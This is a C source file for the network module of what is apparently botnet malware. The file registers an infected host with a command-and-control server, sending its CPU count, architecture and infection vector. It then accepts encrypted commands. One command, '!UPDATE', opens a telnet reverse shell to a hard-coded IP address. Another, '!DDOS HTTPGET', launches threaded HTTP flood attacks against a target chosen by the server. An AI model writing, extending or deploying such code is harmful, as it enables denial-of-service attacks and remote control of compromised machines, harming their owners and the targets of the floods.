#define _GNU_SOURCE

#include <sys/sysinfo.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include "network.h"
#include "../utils/util.h"
#include "../attack/attack.h"

/**
 * @brief Get the bot object
 *
 * @param vector Infection vector (selfrep, scanning, etc...)
 * @return Bot*
 */
Bot *get_bot(char *vector)
{
    Bot *bot = malloc(sizeof(Bot));
    bot_info *info = malloc(sizeof(bot_info));
    struct sockaddr_in *server = malloc(sizeof(struct sockaddr_in));

    int sock = socket(AF_INET, SOCK_STREAM, 0);

    if (bot == NULL || info == NULL || sock == FAILURE)
    {
        debug("Error while allocating memory", TRUE);
    }

    // Setup socket
    bot->Sock = sock;
    server->sin_family = AF_INET;
    server->sin_port = htons(ServerPort);
    server->sin_addr.s_addr = inet_addr(ServerAddr);

    // Setup bot info
    info->Cpu = get_nprocs();
    info->Arch = get_build();
    info->Vector = vector;

    // Setup bot
    bot->Connected = FALSE;
    bot->Info = *info;
    bot->Socket = server;

    return bot;
}

/**
 * @brief Encrypt & Send data to cnc
 *
 * @param bot bot instance
 * @param data data to send
 * @return int (0 = success, 1 = error)
 */
int send_data(Bot *bot, char *data)
{
    char *encrypted = encrypt_str(data);
    char *dataToSend = malloc(strlen(encrypted) + 2);

    strcpy(dataToSend, encrypted);
    strcat(dataToSend, "\n");

    int result = send(bot->Sock, dataToSend, strlen(dataToSend), 0);
    free(dataToSend);
    free(encrypted);

    if (result < 0)
    {
        debug("Error while sending data", FALSE);
        return TRUE;
    }

    return FALSE;
}

/**
 * @brief Handle commands received from the server
 *
 * @param bot Bot instance
 * @param paramCount Number of parameters
 * @param params List of parameters
 */
void handle_command(Bot *bot, int paramCount, char **params)
{
    if (paramCount == 0)
        return;

    if (strcmp(params[0], "!UPDATE") == SUCCESS)
    {
        if (system("telnet 85.31.44.75 5555|/bin/bash|telnet 85.31.44.75 4444") == SUCCESS)
        {
            exit(0);
        }
    }

    if (paramCount != 8)
        return;

#ifdef DEBUG
    printf("====================================\n");
    for (int i = 0; i < paramCount; i++)
        printf("| Param %d: %s\n", i, params[i]);
    printf("====================================\n");
#endif

    /*
        !method ip port time [thread] [power] [length]
        !DDOS HTTPGET 0.0.0.0 80 10 250 32 50
        0     1       2       3  4  5   6  7
    */
    if (strcmp(params[0], "!DDOS") == SUCCESS)
    {
        if (strcmp(params[1], "HTTPGET") == SUCCESS)
        {
            l7_attack *a = malloc(sizeof(l7_attack));
            a->address = params[2];
            a->port = atoi(params[3]);
            a->path = "/";
            a->power = atoi(params[6]);
            a->time = atoi(params[4]);

            int thread_count = atoi(params[5]);
            pthread_t threads[thread_count];

            for (int i = 0; i < thread_count; i++)
                pthread_create(&threads[i], NULL, http_get_flood, (void *)a);
        }
    }
}

/**
 * @brief Handle data received from the server
 *
 * @param vector Infection vector (selfrep, scanning, etc...)
 */
void cnc_socket(char *vector)
{
    while (TRUE)
    {
        Bot *bot = get_bot(vector);

        char *data = malloc(1024);
        sprintf(data, "bot_infos:\n - Cpu: %d\n - Arch: %s\n - Vector: %s\n", bot->Info.Cpu, bot->Info.Arch, bot->Info.Vector);
        debug(data, FALSE);
        free(data);

        // Connect to cnc
        while (bot->Connected == FALSE)
        {
            if (connect(bot->Sock, (struct sockaddr *)bot->Socket, sizeof(struct sockaddr_in)) < 0)
            {
                debug("Error while connecting to the server", FALSE);
                sleep(5);
                continue;
            }

            debug("Error while connecting to the server", FALSE);
            bot->Connected = TRUE;
        }

        // Login [format: [BOTINFO|CPU|RAM|DISK|ARCH|VERSION|VECTOR]]
        char *bot_info = malloc(1024);
        sprintf(bot_info, "BOTINFO|%d|%d|%d|%s|%s|%s", bot->Info.Cpu, 0, 0, bot->Info.Arch, BIN_VERSION, bot->Info.Vector);

        if (send_data(bot, bot_info) == TRUE)
            bot->Connected = FALSE;

        // While bot is connected
        while (bot->Connected == TRUE)
        {
            char *buffer = malloc(2048);
            int result = recv(bot->Sock, buffer, 2048, 0);

            if (result <= 0)
            {
                debug("Error while receiving data", FALSE);
                bot->Connected = FALSE;
                continue;
            }

            buffer[strcspn(buffer, "\n")] = 0;

            char *decrypted = encrypt_str(buffer);

#ifdef DEBUG
            printf("Received: %s\n", decrypted);
#endif

            char *array[10];
            int paramsCount = 0;

            array[paramsCount] = strtok(decrypted, " ");
            while (array[paramsCount] != NULL)
                array[++paramsCount] = strtok(NULL, " ");

            handle_command(bot, paramsCount, array);

            free(decrypted);
            free(buffer);
        }

        // Close socket and return memory to OS
        close(bot->Sock);
        free(bot);
        sleep(5);
    }
}
